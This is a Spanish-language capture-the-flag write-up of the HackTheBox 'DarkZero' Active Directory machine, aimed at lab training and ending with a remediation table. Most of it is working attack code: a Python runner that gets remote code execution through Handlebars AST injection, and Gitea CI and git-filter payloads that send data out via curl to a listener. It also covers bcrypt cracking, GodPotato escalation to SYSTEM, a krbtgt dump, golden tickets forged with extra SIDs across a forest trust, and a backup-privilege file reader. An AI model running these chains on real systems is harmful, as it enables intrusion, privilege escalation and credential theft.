---
title: "HTB DarkZero — SSTI + 2 CVEs de Gitea + GodPotato + bypass cross-forest"
date: 2026-07-31 10:00:00 -0400
categories: [Writeups, Active Directory]
tags: [htb, active-directory, ssti, handlebars, gitea, godpotato, cross-forest, sid-filtering, insane, oscp]
image:
  path: /assets/img/posts/darkzero.png
  alt: "HTB DarkZero — Windows AD, Insane"
---

{% raw %}

## Resumen

**DarkZero** es una máquina Windows Active Directory de HTB, dificultad **Insane**, que va de una **SSTI en Handlebars** sobre un Node.js hasta **root en el DC de un segundo bosque**: encadena 3 CVEs de Gitea/Handlebars, GodPotato, y un **bypass de SID filtering** cross-forest para saltar de `darkzero.ext` a `darkzero.htb`.

| Campo | Valor |
|---|---|
| IP | `10.129.66.233` |
| SO | Windows AD · foothold Linux |
| Dificultad | Insane |
| Técnicas | CVE-2026-33937 (SSTI AST) · CVE-2026-26231 (Gitea) · CVE-2025-68937 (Gitea) · GodPotato · cross-forest SID bypass |

## Reconocimiento

Solo SSH y HTTP. El web redirige a `dzcampaigns.htb`, una app de campañas de rol servida por nginx + Node.js/Express.

```bash
sudo nmap --privileged -p- --min-rate 10000 -n -Pn -oA nmap/dark_tcp.htb 10.129.66.233
# 22/tcp open  ssh
# 80/tcp open  http

sudo nmap --privileged -sC -sV -p22,80 -oA nmap/dark_svc 10.129.66.233
# 22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
# 80/tcp open  http  nginx 1.24.0 (Ubuntu)
# |_http-title: Did not follow redirect to http://dzcampaigns.htb/
```

> Antes de fuzzear nada, probá el vhost directamente contra la IP: `curl -s -H "Host: dzcampaigns.htb" http://10.129.66.233/ -i | head -20`. Si la app responde distinto, añadí la entrada a `/etc/hosts` — muchas apps Node/Express solo montan sus rutas bajo el `Host` correcto.
{: .prompt-tip }

## SSTI en Handlebars → RCE (CVE-2026-33937)

Al crear un personaje se puede dejar un `campaign_message` que se renderiza como plantilla. `{{7*7}}` devuelve **HTTP 400** (Handlebars rechaza operadores) pero `{{#if 1}}YES{{/if}}` se renderiza: es **Handlebars.js**. La versión es vulnerable a inyección de **AST** (CVE-2026-33937): enviando el mensaje como objeto JSON en vez de string, se salta el compilador y se ejecuta código.

```bash
# 1) sacar el token _csrf del formulario de registro
T1=$(curl -s -H 'Host: dzcampaigns.htb' -c cj.txt http://10.129.66.233/register \
      | grep -oP 'name="_csrf"[^>]*value="\K[^"]+')

# 2) registrar usuario
curl -s -H 'Host: dzcampaigns.htb' -b cj.txt -c cj.txt \
      --data-urlencode "_csrf=$T1" \
      --data-urlencode 'email=grenois@x.htb' \
      --data-urlencode 'username=grenois' \
      --data-urlencode 'password=Grenois123!' \
      http://10.129.66.233/register -i | head -1

# 3) token nuevo + login
T2=$(curl -s -H 'Host: dzcampaigns.htb' -b cj.txt -c cj.txt http://10.129.66.233/login \
      | grep -oP 'name="_csrf"[^>]*value="\K[^"]+')
curl -s -H 'Host: dzcampaigns.htb' -b cj.txt -c cj.txt \
      --data-urlencode "_csrf=$T2" \
      --data-urlencode 'email=grenois@x.htb' \
      --data-urlencode 'password=Grenois123!' \
      http://10.129.66.233/login -i | head -1
# HTTP/1.1 302 Found   Location: /dashboard
```

> El token `_csrf` cambia por petición y va ligado a la cookie de sesión que lo emitió; hay que pedirlo primero (GET al formulario) y reenviarlo en el POST con la misma jar de cookies. Para flujos con muchos pasos conviene pasarse a `requests.Session()`.
{: .prompt-tip }

```bash
# {{7*7}} -> 400 (Handlebars no admite operadores en {{ }})
# {{#if 1}}YES{{/if}} se renderiza en /campaign/1:
T3=$(curl -s -H 'Host: dzcampaigns.htb' -b cj.txt http://10.129.66.233/character/new \
      | grep -oP 'name="_csrf"[^>]*value="\K[^"]+')
curl -s -H 'Host: dzcampaigns.htb' -b cj.txt \
      --data-urlencode "_csrf=$T3" --data-urlencode 'name=grx' \
      --data-urlencode 'race=grx' --data-urlencode 'class=grx' \
      --data-urlencode 'backstory=grx' --data-urlencode 'campaign_id=1' \
      --data-urlencode 'campaign_message=AAA{{#if 1}}YES{{else}}NO{{/if}}BBB' \
      http://10.129.66.233/character
curl -s -H 'Host: dzcampaigns.htb' -b cj.txt http://10.129.66.233/campaign/1
# -> <p>AAAYESBBB</p>  # motor = Handlebars.js
```

> Cada motor de plantillas falla distinto. `{{7*7}}` → `49` es Jinja/Twig; que devuelva error señala Handlebars/Mustache (no permiten expresiones). No disparés payloads a ciegas: un par de sondas te dicen el motor exacto.
{: .prompt-tip }

El PoC del AST: se pasa un `Program` con un `MustacheStatement` cuyo `BooleanLiteral.value` rompe el `append` generado y concatena una llamada a `child_process.execSync`. El campo se manda como **objeto JSON**, no como string.

```json
// POST /character  (mismas cookies cj.txt) con campaign_message como OBJETO
{
  "_csrf": "<T3>", "name":"g", "race":"g", "class":"g", "backstory":"g", "campaign_id":"1",
  "campaign_message": {
    "type": "Program",
    "body": [{ "type": "MustacheStatement",
       "path": { "type":"PathExpression", "parts":["log"] },
       "params": [{ "type":"BooleanLiteral", "value":
          "{}, {hash: {}})) + process.mainModule.require('child_process')
            .execSync('id') + Object(String(''" }],
       "escaped": true,
       "loc": {"start":{}, "end":{}}
    }]
  }
}
// GET /campaign/1  ->  uid=996(darkzero) gid=987(darkzero)
```

> Handlebars compila plantilla → AST → función JS. Las protecciones viven en el **parser** (texto → AST). Si la app te deja inyectar el AST **ya construido** (aceptando el campo como JSON), esas comprobaciones no se ejecutan nunca. Un `BooleanLiteral` con paréntesis desbalanceados cierra el `append(...)` que genera el compilador y deja tu `require('child_process')` pegado en el código emitido.
{: .prompt-danger }

> Cuando una API acepta el mismo campo como `string` **y** como `object` (según el `Content-Type`), probá siempre la variante objeto: es donde suelen romperse las validaciones pensadas solo para texto.
{: .prompt-tip }

Cada comando se ejecuta y su salida se renderiza en un `<p>` de la campaña, sin shell interactiva. Se envuelve el comando real en `bash -c`, se pasa por `base64` y se delimita con un marcador aleatorio por petición:

```python
#!/usr/bin/env python3
# DarkZero SSTI command runner (CVE-2026-33937). Uso: ./shell.py '<cmd>'
import re, json, requests, sys, base64, html, uuid

IP="10.129.66.233"; HOST="dzcampaigns.htb"
EMAIL="grenois@x.htb"; PW="Grenois123!"; USER="grenois"
s=requests.Session(); H={"Host":HOST}
def u(p): return f"http://{IP}{p}"
def tok(p):
    r=s.get(u(p),headers=H); m=re.search(r'name="_csrf"[^>]*value="([^"]+)"',r.text)
    return (m.group(1) if m else None), r
def ensure_login():
    t,_=tok("/login")
    r=s.post(u("/login"),headers=H,data={"_csrf":t,"email":EMAIL,"password":PW},allow_redirects=False)
    if r.status_code!=302:
        t,_=tok("/register")
        s.post(u("/register"),headers=H,data={"_csrf":t,"email":EMAIL,"username":USER,"password":PW},allow_redirects=False)
        t,_=tok("/login")
        s.post(u("/login"),headers=H,data={"_csrf":t,"email":EMAIL,"password":PW},allow_redirects=False)
def run(cmd):
    mk = uuid.uuid4().hex[:10].upper()                       # marcador único por petición
    b = base64.b64encode(("bash -c "+json.dumps(cmd)).encode()).decode()
    inner = f"echo B{mk}$(echo {b}|base64 -d|bash 2>&1|base64 -w0)E{mk}"
    js_cmd = inner.replace("\\\\","\\\\\\\\").replace("'","'\\\\''")   # escapar para el string JS
    val = "{}, {hash: {}})) + process.mainModule.require('child_process').execSync('" + js_cmd + "') + Object(String(''"
    t,_=tok("/character/new")
    body={"_csrf":t,"name":"g","race":"g","class":"g","backstory":"g","campaign_id":"1",
          "campaign_message":{"type":"Program","body":[{"type":"MustacheStatement",
            "path":{"type":"PathExpression","parts":["log"]},
            "params":[{"type":"BooleanLiteral","value":val}],"escaped":True,
            "loc":{"start":{},"end":{}}}]}}
    s.post(u("/character"),headers={**H,"Content-Type":"application/json"},data=json.dumps(body))
    page=s.get(u("/campaign/1"),headers=H).text
    m=re.search(rf'B{mk}([A-Za-z0-9+/=]*)E{mk}', html.unescape(page))
    return base64.b64decode(m.group(1)).decode(errors="replace") if m else "[sin salida]"
if __name__=="__main__":
    ensure_login(); print(run(sys.argv[1] if len(sys.argv)>1 else "id"), end="")
```

> La salida se mezcla con el HTML de la página y con mensajes de peticiones anteriores. Delimitar con `B<marcador>...E<marcador>` y viajar en base64 evita que saltos de línea, comillas o el auto-escapado de Handlebars rompan el parseo. Cualquier RCE ciega/renderizada se vuelve manejable con este patrón: marcador único + base64 + regex.
{: .prompt-tip }

## Pivote a josh

Las variables de entorno del servicio filtran las credenciales de MySQL. En la tabla `users` hay dos hashes bcrypt; el de `josh` cae con rockyou, y josh reutiliza esa contraseña para SSH. Además es **usuario de dominio en `darkzero.ext`**.

```bash
python3 shell.py 'env' | grep DB_
DB_USER=darkzero   DB_PASSWORD=C4ntFindMyDMpass!

python3 shell.py 'mysql -u darkzero -pC4ntFindMyDMpass! darkzero_campaigns -e "SELECT email,password_hash FROM users"'
josh@dzcampaigns.htb   $2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK

# guardo el hash tal cual (formato $2b$ = bcrypt, hashcat -m 3200)
echo '$2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK' > josh.hash
hashcat -m 3200 -a 0 josh.hash /usr/share/wordlists/rockyou.txt
$2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK:Rangers1
```

> Las apps meten credenciales de BD en variables de entorno (`.env` / systemd). Con RCE, `env` / `/proc/self/environ` te las regala. Tras cualquier RCE, la tripleta rápida es `env`, `cat .env` y volcar la tabla de usuarios.
{: .prompt-tip }

**Credenciales:** `josh : Rangers1`

```bash
sshpass -p 'Rangers1' ssh -o StrictHostKeyChecking=no josh@10.129.66.233
josh@dzcampaigns:~$ id
uid=780601110(josh) groups=780600513(domain users),780601111(repoaudit)
josh@dzcampaigns:~$ ip a
eth0: 172.16.20.3/24   # segunda pata: red interna del AD
```

> Un Linux unido a un dominio AD (SSSD o winbind) no crea UIDs locales pequeños para las cuentas de dominio: mapea el RID de AD a un UID/GID Linux enorme y estable (aquí `780600000 + RID`). Ver `uid=780601110` es la prueba de que `josh` no es una cuenta local — es `josh@darkzero.ext`.
{: .prompt-info }

> **Doble homing:** josh está en el grupo `repoaudit` (pista: Gitea) y la máquina tiene una segunda interfaz `172.16.20.0/24`. La superficie real —los DCs y el Gitea— vive ahí dentro.
{: .prompt-warning }

## Túnel + Gitea vía Kerberos

Se monta un SOCKS con SSH y se descubren dos DCs: `DC01 = darkzero.htb` (172.16.20.1) y `DC02 = darkzero.ext` (172.16.20.2), este último con Gitea en :3000. josh es usuario de `darkzero.ext`, y Gitea autentica con **SSPI/Kerberos**: con un TGT de josh se entra a la API sin contraseña de Gitea.

```bash
sshpass -p 'Rangers1' ssh -D 1080 -N -o StrictHostKeyChecking=no josh@10.129.66.233 &

# /etc/proxychains4.conf (o pc.conf local):
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080

echo '172.16.20.1 DC01.darkzero.htb darkzero.htb DC01' | sudo tee -a /etc/hosts
echo '172.16.20.2 DC02.darkzero.ext darkzero.ext DC02' | sudo tee -a /etc/hosts

proxychains4 -q -f pc.conf nxc smb 172.16.20.1-3
172.16.20.1  DC01  darkzero.htb
172.16.20.2  DC02  darkzero.ext  (Gitea :3000)
```

> `ssh -D` da un proxy SOCKS5 sin subir binarios. Con `proxy_dns` en proxychains, los nombres se resuelven en el host interno — clave para Kerberos, que odia trabajar por IP. Agregá también las entradas a `/etc/hosts` local para clientes Kerberos que resuelven antes de tocar el proxy.
{: .prompt-tip }

```bash
# /etc/krb5.conf (o KRB5_CONFIG=./krb5.conf)
[libdefaults]
    default_realm = DARKZERO.EXT
    dns_lookup_realm = false
    dns_lookup_kdc = false
    rdns = false
    udp_preference_limit = 1
    forwardable = true
[realms]
    DARKZERO.EXT = { kdc = dc02.darkzero.ext }
    DARKZERO.HTB = { kdc = dc01.darkzero.htb }
[domain_realm]
    .darkzero.ext = DARKZERO.EXT
    .darkzero.htb = DARKZERO.HTB

# Skew del KDC ~+7h -> faketime evita KRB5KRB_AP_ERR_SKEW sin tocar el reloj de Kali
export KRB5_CONFIG=/home/flash/Documents/HTB/forest/OSCP/krb5.conf
faketime '+7 hours' kinit josh@DARKZERO.EXT   # pide la pass de josh: Rangers1
klist
Default principal: josh@DARKZERO.EXT   Valid: krbtgt/DARKZERO.EXT@DARKZERO.EXT

proxychains4 -q -f pc.conf curl --negotiate -u : http://gitea.darkzero.ext:3000/api/v1/user
{"login":"darkzero-ext_josh", "id":..., "is_admin":false}   # Gitea 1.25.0
```

> Si Kerberos da `KRB5KRB_AP_ERR_SKEW`, no es la contraseña: comparás tu reloj con la cabecera `Date:` de cualquier respuesta HTTP del dominio y ajustás con `faketime` esa diferencia exacta.
{: .prompt-tip }

El repo `DarkZero/DarkZero-Campaigns` tiene Gitea Actions habilitado (runner `ubuntu`) y solo permiso de `pull`.

## Gitea maintainer-edit bypass → svc-runner (CVE-2026-26231)

Solo hay permiso `pull`, pero **CVE-2026-26231** permite empujar a un repo que solo se puede leer: se crea un PR **invertido** (base = mi fork, head = upstream) con "Allow edits from maintainers". El hook `pre-receive` comprueba si hay escritura sobre la **base** (mi fork → sí) y autoriza el push contra el upstream. Como el workflow dispara `on: push`, se ejecuta código en el runner **svc-runner** — dueño de la user flag.

```bash
export GU=darkzero-ext_josh GP='Grenois+2026!'
alias pc='proxychains4 -q -f pc.conf'

# 1) fork del repo (solo tengo pull sobre el upstream)
pc curl -s -u "$GU:$GP" -X POST \
      http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/forks \
      -H 'Content-Type: application/json' -d '{}'
# -> 201 darkzero-ext_josh/DarkZero-Campaigns (fork listo)

# 2) clono MI fork y empujo una rama vieja para tener diff frente al upstream
pc git clone http://$GU:$GP@gitea.darkzero.ext:3000/darkzero-ext_josh/DarkZero-Campaigns.git
cd DarkZero-Campaigns
git log --oneline -1 HEAD~5
86668d6 initial import
pc git push origin 86668d6:oldbase

# 3) PR INVERTIDO por el FORM WEB (no la API: PATCH da 403 si no eres dueño del head)
#    base = mi fork:oldbase (dueño = yo)   head = DarkZero:main (upstream, solo pull)
pc curl -s -u "$GU:$GP" \
      http://gitea.darkzero.ext:3000/darkzero-ext_josh/DarkZero-Campaigns/compare/oldbase...DarkZero:DarkZero-Campaigns:main \
      -d '_csrf=<token del GET previo>' \
      -d 'title=sync' -d 'allow_maintainer_edit=on'
PR#2  ame=True  base=darkzero-ext_josh:oldbase  head=DarkZero:main

# 4) push NO autorizado al upstream: el pre-receive comprueba permiso sobre la BASE (mi fork) -> pasa
pc git remote add upstream http://$GU:$GP@gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns.git
pc git push upstream HEAD:main
0d2c697..4520bf1  HEAD -> main   [+] push aceptado  # yo solo tenía "pull" sobre este repo
```

> "Allow edits from maintainers" deja que los maintainers de la **base** editen la rama **head**. Normalmente base = upstream y head = tu fork. Al **invertirlo** (base = tu fork, del que eres dueño; head = upstream), el hook razona "¿el que empuja puede escribir en la base?" → sí → y te deja escribir en el upstream. El fix (1.26.2) añade comprobar también el permiso del *poster* sobre el head.
{: .prompt-danger }

> El flag `allow_maintainer_edit` solo se puede fijar al **crear** el PR por el formulario web (la API/PATCH da 403 si no eres dueño del head). Y necesitás un diff: ramificá tu fork en un commit anterior al tip del upstream.
{: .prompt-tip }

```
darkzero-ext_josh (pull-only sobre DarkZero-Campaigns)
  └─▶ PR invertido + allow_maintainer_edit (CVE-2026-26231)
        └─▶ push a upstream:main → Gitea Actions → RCE como svc-runner
```

Se sustituye el workflow por uno que exfiltra la user flag hacia un colector en SRV01 (`172.16.20.3`), levantando el listener en la propia caja josh (que sí tiene ruta a `172.16.20.0/24`).

```bash
# en la sesión SSH de josh (172.16.20.3)
josh@dzcampaigns:~$ python3 -m http.server 8000 >> /tmp/httplog 2>&1 &

pc git add .gitea/workflows/main.yml
pc git commit -m "ci: sync"
pc git push upstream HEAD:main
```

> El runner de Gitea Actions vive en la red interna `172.16.20.0/24`; mi IP de la VPN de HTB no. Pero josh vía SSH ya está dentro de esa red, así que se monta el "colector" ahí mismo con `python3 -m http.server`. Cuando el segmento objetivo no es alcanzable desde tu Kali, usá el pivote ya comprometido como colector/listener.
{: .prompt-tip }

```yaml
# .gitea/workflows/main.yml
on: [push]
jobs:
  ci:
    runs-on: ubuntu
    steps:
      - run: |
          curl http://172.16.20.3:8000/UF_$(cat /home/svc-runner/user.txt | base64 -w0)
```

> Gitea Actions es (casi) un clon de GitHub Actions: `on: push` dispara el job en cuanto el push se completa, sin aprobación humana. `runs-on: ubuntu` apunta al runner registrado, que corre como `svc-runner`, dueño de `/home/svc-runner/user.txt`. En cualquier CI/CD al que puedas empujar código, el pipeline **es** RCE en la identidad del runner.
{: .prompt-danger }

```bash
josh@dzcampaigns:~$ grep UF_ /tmp/httplog
"GET /UF_YjBhNDk1NmNlZjM0OWZhZmJhZjdmYTNlMDVmZjc4ZjIK HTTP/1.1" 404 -
josh@dzcampaigns:~$ echo YjBhNDk1NmNlZjM0OWZhZmJhZjdmYTNlMDVmZjc4ZjIK | base64 -d
b0a4956cef349fafbaf7fa3e05ff78f2
```

> `user.txt` vive en `/home/svc-runner/user.txt` (modo `640 svc-runner:root`) — por eso josh/darkzero no la veían. El runner **es** svc-runner, así que el propio job la lee. El 404 es normal, solo interesa que el GET quedó logueado con la flag en base64.
{: .prompt-info }

**User flag:** `b0a4956cef349fafbaf7fa3e05ff78f2`

## Template traversal → svc-gitea → SYSTEM (CVE-2025-68937)

Gitea corre en **DC02 (Windows) como svc-gitea**. Un fallo en el procesado de repositorios plantilla (CVE-2025-68937, arreglado en 1.25.5) sigue a los **symlinks** al escribir. Con el truco Windows del **punto final** (`.git.` → `.git`) se planta un `.git/config` con un filtro `clean` que ejecuta PowerShell cuando Gitea procesa el repo generado.

```bash
# 1) crear un repo normal "pwn_template" en Gitea (vía API, dueño darkzero-ext_josh)
pc curl -s -u "$GU:$GP" -X POST http://gitea.darkzero.ext:3000/api/v1/user/repos \
      -H 'Content-Type: application/json' \
      -d '{"name":"pwn_template","private":false,"auto_init":true}'

# 2) clonarlo y montar la estructura que CVE-2025-68937 va a expandir
pc git clone http://$GU:$GP@gitea.darkzero.ext:3000/darkzero-ext_josh/pwn_template.git
cd pwn_template

# .gitattributes: marca "trigger" para que git le aplique el filtro "pwn" al clonar/generar
echo 'trigger filter=pwn' > .gitattributes
echo 'x' > trigger

# .gitea/template: patrón ** = expandir variables ${...} en TODOS los archivos y RUTAS
mkdir -p .gitea && echo '**' > .gitea/template

# carpeta cuyo NOMBRE es la variable de plantilla: se expande con la description del repo generado
mkdir -p '${REPO_DESCRIPTION}'
cat > '${REPO_DESCRIPTION}/config' <<'EOF'
[filter "pwn"]
    clean = powershell -EncodedCommand <B64_UTF16LE>
EOF
git add -A && git commit -m init
pc git push origin main
```

> El generador de plantillas expande variables (`${REPO_DESCRIPTION}`) también en **rutas** y sigue symlinks al escribir. Windows elimina el punto/espacio final de cada componente de ruta, así que un repo generado con `description = ".git."` aterriza en una carpeta llamada `.git` — esquivando el chequeo literal de "no puedes llamarte .git". En esa carpeta cae el `config` con `[filter "pwn"] clean = ...`: en cuanto Gitea procesa `trigger` para plantillarlo, ejecuta el `clean` como `svc-gitea`.
{: .prompt-danger }

> Usá `-EncodedCommand` (base64 de UTF-16LE): el valor de un filtro en `.git/config` con comillas se rompe al parsear el INI, pero el base64 va limpio. El `clean` devuelve su stdout como contenido del blob resultante: es un canal de salida sin shell reversa.
{: .prompt-tip }

```bash
# PowerShell a ejecutar (marcador + exfil a josh:8000, igual que la user flag)
CMD='whoami; whoami /priv'
B64=$(echo -n "Write-Output 'MARK'; $CMD" | iconv -t utf16le | base64 -w0)

# reescribo config con el -EncodedCommand real y hago push otra vez
sed -i "s#<B64_UTF16LE>#$B64#" '${REPO_DESCRIPTION}/config'
git commit -am upd && pc git push origin main

# disparo la generación (NEWREPO único, description=".git." -> NTFS normaliza a .git)
NEWREPO=pwn_$(date +%s)
pc curl -s -u "$GU:$GP" -X POST \
      http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/pwn_template/generate \
      -H 'Content-Type: application/json' \
      -d "{\"owner\":\"darkzero-ext_josh\",\"name\":\"$NEWREPO\",\"description\":\".git.\",\"private\":false,\"git_content\":true}"

# en josh, sirvo un log HTTP y el clean filter me exfiltra la salida en la URL
josh@dzcampaigns:~$ python3 -m http.server 8000 >> /tmp/httplog 2>&1 &
GET /OUT_<base64 del stdout de whoami/whoami-priv> HTTP/1.1" 404
```

> Repetir a mano "editar config → push → generate → leer log" por cada comando es lento. Automatizá el ciclo en un `winrun.sh`: empuja el comando al filtro, dispara `generate` con un nombre de repo único, y hace polling sobre el log en josh buscando su marcador para no confundir salidas concurrentes.
{: .prompt-tip }

svc-gitea tiene `SeImpersonatePrivilege` → **GodPotato** → SYSTEM.

```powershell
# OJO: whoami de git-bash tapa el de Windows -> ruta completa
PS> ./winrun.sh 'C:\Windows\System32\whoami.exe /priv'
SeImpersonatePrivilege   Enabled

PS> ./winrun.sh 'C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"'
-> nt authority\system
PS> ./winrun.sh "C:\Windows\Temp\gp.exe -cmd 'cmd /c net group \"Domain Admins\" josh /add /domain'"
The command completed successfully.
```

> Con `SeImpersonatePrivilege`, GodPotato fuerza a un servicio privilegiado (RPCSS) a autenticarse contra un named pipe que controlás, robando su token de SYSTEM. En un DC, SYSTEM = control total del dominio. Si un comando "no da salida" en Windows, comprobá si el `whoami` del PATH es el de git-bash: usá siempre `C:\Windows\System32\whoami.exe`.
{: .prompt-danger }

```bash
pc nxc smb 172.16.20.2 -u josh -p Rangers1 -d darkzero.ext
[+] darkzero.ext\josh (Pwn3d!)

pc secretsdump.py -just-dc-user krbtgt darkzero.ext/josh:Rangers1@172.16.20.2
krbtgt aes256: 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6
Domain SID:   S-1-5-21-2850783758-1231244658-2051857529
```

> Un DCSync completo es ruidoso y lento; si solo necesitás `krbtgt` para forjar tickets, pedí justo esa cuenta con `-just-dc-user krbtgt`.
{: .prompt-tip }

> **darkzero.ext comprometido por completo.** Con la `krbtgt` se pueden forjar tickets en este bosque. Pero la flag está en **DC01 (darkzero.htb)**, el otro lado de un forest trust.
{: .prompt-danger }

## Cross-forest: bypass de SID filtering → Root

La confianza tiene `trustAttributes = 72` (forest-transitive + *treat-as-external*), así que el **SID filtering** actúa como en un trust externo: descarta SIDs con RID < 1000 del otro bosque, pero **deja pasar los RID ≥ 1000**. En `darkzero.htb` existe un grupo **InfrastructureAdministrators** (RID `1603`) anidado en **Backup Operators**. Se forja un ticket en `darkzero.ext` con ese SID como extra-SID, y sobrevive al filtro.

```bash
pc bloodyAD --host dc02.darkzero.ext -d darkzero.ext -u josh -p Rangers1 get trusts
darkzero.ext  +-- FOREST_TRANSITIVE|AD : darkzero.htb  trustAttributes=72

# enumerar el SID base y los grupos custom del bosque vecino (RID > 1000)
pc lookupsid.py -domain-sid darkzero.ext/josh:Rangers1@172.16.20.1
Domain SID: S-1-5-21-2899195410-1848524783-1547768515

pc lookupsid.py darkzero.ext/josh:Rangers1@172.16.20.1 | grep -iE "admin|backup|1[6-9][0-9]{2}:"
1603: darkzero\InfrastructureAdministrators (SidTypeGroup)  # RID > 1000

# confirmar el anidamiento en Backup Operators (vía LDAP, mismo túnel)
pc bloodyAD --host dc01.darkzero.htb -d darkzero.htb -u josh -p Rangers1 get membership "InfrastructureAdministrators"
CN=Backup Operators,CN=Builtin,DC=darkzero,DC=htb
```

> El PAC de un ticket lleva los SIDs de tus grupos. En un trust externo/quarantined, el DC destino filtra los SIDs "ajenos" con RID < 1000 (los bien conocidos: 512 Domain Admins, 519 Enterprise Admins...). Pero los grupos **creados por el admin** (RID ≥ 1000) **no** se filtran. Si encontrás uno privilegiado anidado en un grupo del bosque objetivo, lo inyectás como extra-SID y el DC te lo concede.
{: .prompt-danger }

> `trustAttributes = 0x48` (72) = `FOREST_TRANSITIVE` + `TREAT_AS_EXTERNAL`. Ese "external" es la señal: buscá grupos con RID ≥ 1000 y `adminCount=1` o anidados en grupos privilegiados del bosque objetivo.
{: .prompt-tip }

```
Administrator @ darkzero.ext (ticket forjado con krbtgt del bosque)
  └─▶ extra-SID = ...-1603 (RID > 1000, no filtrado)
        └─▶ InfrastructureAdministrators @ darkzero.htb (anidado en Backup Operators → SeBackupPrivilege)
              └─▶ lectura con backup intent sobre DC01 C$
                    └─▶ root.txt en DC01
```

```bash
# golden ticket en darkzero.ext con el extra-SID del grupo del OTRO bosque
pc ticketer.py \
    -aesKey 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6 \
    -domain-sid S-1-5-21-2850783758-1231244658-2051857529 -domain darkzero.ext \
    -extra-sid S-1-5-21-2899195410-1848524783-1547768515-1603 \
    -user-id 500 -groups 513,512,520,518,519 Administrator
Saving ticket in Administrator.ccache
export KRB5CCNAME=Administrator.ccache

# salto 1: TGT del bosque -> TGT inter-reino hacia DARKZERO.HTB (referral, contra el KDC de darkzero.ext)
pc getST.py -k -no-pass -spn krbtgt/DARKZERO.HTB -dc-ip 172.16.20.2 darkzero.ext/Administrator
Saving ticket in Administrator@krbtgt_DARKZERO.HTB@DARKZERO.EXT.ccache
export KRB5CCNAME=Administrator@krbtgt_DARKZERO.HTB@DARKZERO.EXT.ccache

# salto 2: con el TGT inter-reino, pido el ticket de servicio YA contra el KDC del otro bosque
pc getST.py -k -no-pass -spn cifs/dc01.darkzero.htb -dc-ip 172.16.20.1 darkzero.htb/Administrator
Saving ticket in Administrator@cifs_dc01.darkzero.htb@DARKZERO.HTB.ccache
export KRB5CCNAME=Administrator@cifs_dc01.darkzero.htb@DARKZERO.HTB.ccache
```

> Si le das a `getST.py` con `-spn` de un servicio en otro dominio un `-dc-ip` del KDC equivocado, falla. La forma fiable: dos pasos explícitos — 1) TGT inter-reino (`krbtgt/DARKZERO.HTB`) contra el KDC de origen; 2) con ESE ticket como `KRB5CCNAME`, pedir el servicio final ya contra el KDC de destino. Nombrá tus ccaches de forma descriptiva: con varios saltos cross-forest es fácil perder la cuenta.
{: .prompt-tip }

**Leer root.txt con SeBackupPrivilege.** Backup Operators no puede hacer un `dir` normal de `C:\Users\Administrator` (la ACL lo deniega), pero `SeBackupPrivilege` permite abrir cualquier fichero con `FILE_OPEN_FOR_BACKUP_INTENT`, que salta las ACLs "por diseño". Sin una herramienta CLI lista que combine SMB + Kerberos + backup intent + ccache forjado, se escribió directo sobre `impacket.smbconnection`:

```python
#!/usr/bin/env python3
# backup_read.py: leer un archivo de C$ en DC01 usando SeBackupPrivilege + ccache Kerberos
from impacket.smbconnection import SMBConnection
from impacket.smb3structs import (
    FILE_READ_DATA, FILE_READ_ATTRIBUTES, FILE_SHARE_READ, FILE_SHARE_WRITE, FILE_SHARE_DELETE,
    FILE_NON_DIRECTORY_FILE, FILE_OPEN, FILE_ATTRIBUTE_NORMAL)
FILE_OPEN_FOR_BACKUP_INTENT = 0x00004000

name, path, ip, kdc = sys.argv[1:5]
smb = SMBConnection(name, ip)                                   # name=SPN, ip=socket real (vía proxychains)
smb.kerberosLogin("Administrator", "", "DARKZERO.EXT", "", "", "", kdcHost=kdc, useCache=True)

raw = smb._SMBConnection
tree_id = raw.connectTree("C$")
file_id = raw.create(tree_id, path, FILE_READ_DATA | FILE_READ_ATTRIBUTES,
   FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
   FILE_NON_DIRECTORY_FILE | FILE_OPEN_FOR_BACKUP_INTENT,
   FILE_OPEN, FILE_ATTRIBUTE_NORMAL)
sys.stdout.buffer.write(raw.read(tree_id, file_id, 0, 4096))
```

```bash
pc python3 backup_read.py dc01.darkzero.htb 'Users\Administrator\Desktop\root.txt' 172.16.20.1 172.16.20.2
cbcc06df33f0feafbe457ce42de94f80
```

> `SMBConnection(name, ip)` usa el nombre `dc01.darkzero.htb` para negociar el SPN Kerberos pero la IP `172.16.20.1` para el socket TCP real (a través de proxychains), y `useCache=True` reutiliza el ticket `cifs/` ya forjado en `KRB5CCNAME`. `kdcHost` apunta al KDC de `darkzero.ext` porque el principal `Administrator` vive ahí, aunque el archivo leído esté en el otro bosque.
{: .prompt-info }

**Root flag (DC01, darkzero.htb):** `cbcc06df33f0feafbe457ce42de94f80`

## Remediación

| Vulnerabilidad | Severidad | Mitigación |
|---|---|---|
| SSTI Handlebars (CVE-2026-33937): campo aceptado como AST/JSON | Crítica | Actualizar Handlebars; rechazar objetos donde se espera texto; nunca compilar entrada de usuario como plantilla |
| Credenciales en entorno + reuso (DB_PASSWORD → bcrypt débil → SSH) | Crítica | Secretos en un vault, no en `env`; políticas de contraseñas; sin reutilización BD↔SSH |
| Gitea maintainer-edit (CVE-2026-26231): push a repo de solo lectura | Crítica | Actualizar Gitea ≥ 1.26.2; revisar `SupportProcReceive` y permisos de Actions |
| Gitea template traversal (CVE-2025-68937): symlink + `.git.` → RCE | Crítica | Actualizar Gitea ≥ 1.25.5; ejecutar el servicio con cuenta sin `SeImpersonate` |
| SID filtering permisivo (trust attr 72): RID ≥ 1000 no filtrado cross-forest | Crítica | Habilitar SID filtering/quarantine estricto en el trust; no anidar grupos custom en Backup Operators |
| Cuentas de servicio con privilegio en el DC (svc-gitea con SeImpersonate en DC02) | Alta | No alojar servicios de terceros en un DC; gMSA con privilegios mínimos |

